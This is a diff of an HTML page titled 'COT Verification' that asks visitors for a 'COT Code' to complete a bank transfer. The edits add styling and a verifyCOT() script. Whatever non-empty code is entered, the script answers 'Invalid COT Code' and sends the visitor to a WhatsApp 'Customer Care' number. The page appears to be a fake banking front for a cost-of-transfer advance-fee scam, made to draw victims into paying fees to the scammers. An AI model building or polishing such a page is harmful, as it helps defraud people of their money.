@@ -1,64 +1,95 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>COT Verification</title>
 
 <style>
+*{
+    box-sizing:border-box;
+}
+
 body{
-margin:0;
-font-family:Arial,sans-serif;
-background:#f4f7fb;
+    margin:0;
+    font-family:Arial,sans-serif;
+    background:#f4f7fb;
+    color:#222;
 }
 
 .header{
-background:#1f4ed8;
-color:white;
-padding:20px;
-text-align:center;
+    background:#1f4ed8;
+    color:white;
+    padding:20px;
+    text-align:center;
+}
+
+.header h2{
+    margin:0;
+    font-size:24px;
 }
 
 .container{
-width:90%;
-max-width:450px;
-margin:30px auto;
-background:white;
-padding:20px;
-border-radius:15px;
-box-shadow:0 5px 15px rgba(0,0,0,.1);
+    width:90%;
+    max-width:450px;
+    margin:30px auto;
+    background:white;
+    padding:20px;
+    border-radius:15px;
+    box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+
+.container p{
+    line-height:1.5;
 }
 
 input{
-width:100%;
-padding:15px;
-margin-top:15px;
-border:1px solid #ccc;
-border-radius:10px;
-box-sizing:border-box;
+    width:100%;
+    padding:15px;
+    margin-top:15px;
+    border:1px solid #ccc;
+    border-radius:10px;
+    font-size:16px;
+    outline:none;
+}
+
+input:focus{
+    border-color:#1f4ed8;
 }
 
 .cot-message{
-font-size:13px;
-color:#666;
-text-align:center;
-margin-top:10px;
-line-height:1.5;
+    font-size:13px;
+    color:#666;
+    text-align:center;
+    margin-top:15px;
+    line-height:1.6;
 }
 
 .cot-message a{
-color:#25D366;
-font-weight:bold;
-text-decoration:none;
+    color:#25D366;
+    font-weight:bold;
+    text-decoration:none;
+}
+
+.cot-message a:hover{
+    text-decoration:underline;
 }
 
 button{
-width:100%;
-padding:15px;
-margin-top:20px;
-background:#1f4ed8;
-color:white;
-border:none;
-border-radius:10px;
-font-size:17px;
+    width:100%;
+    padding:15px;
+    margin-top:20px;
+    background:#1f4ed8;
+    color:white;
+    border:none;
+    border-radius:10px;
+    font-size:17px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#173db0;
 }
 </style>
 
@@ -67,29 +98,49 @@ font-size:17px;
 <body>
 
 <div class="header">
-<h2>COT Verification</h2>
+    <h2>COT Verification</h2>
 </div>
 
 <div class="container">
 
-<p>Please enter your COT Code to complete this transfer.</p>
+    <p>
+        Please enter your COT Code to complete this transfer.
+    </p>
 
-<input type="password" placeholder="Enter COT Code">
+    <input
+        type="password"
+        id="cotCode"
+        placeholder="Enter COT Code"
+        autocomplete="off"
+    >
 
-<p class="cot-message">
-Need assistance with your COT code?
-Please contact Customer Care on WhatsApp.
-<br>
-<a href="https://wa.me/+2347072217429 " target="_blank">
-+234 7072217429 
-</a>
-</p>
+    <p class="cot-message">
+        Need assistance with your COT code?<br>
+        Please contact Customer Care on WhatsApp.<br>
 
-<button onclick="alert('Invalid COT Code. Please contact your account officer.')">
-Complete Transfer
-</button>
+        <a href="https://wa.me/2347072217429" target="_blank">
+            +234 707 221 7429
+        </a>
+    </p>
+
+    <button type="button" onclick="verifyCOT()">
+        Complete Transfer
+    </button>
 
 </div>
+
+<script>
+function verifyCOT(){
+    const cotCode = document.getElementById("cotCode").value.trim();
+
+    if(cotCode === ""){
+        alert("Please enter your COT Code.");
+        return;
+    }
+
+    alert("Invalid COT Code. Please contact your account officer.");
+}
+</script>
 
 </body>
 </html>
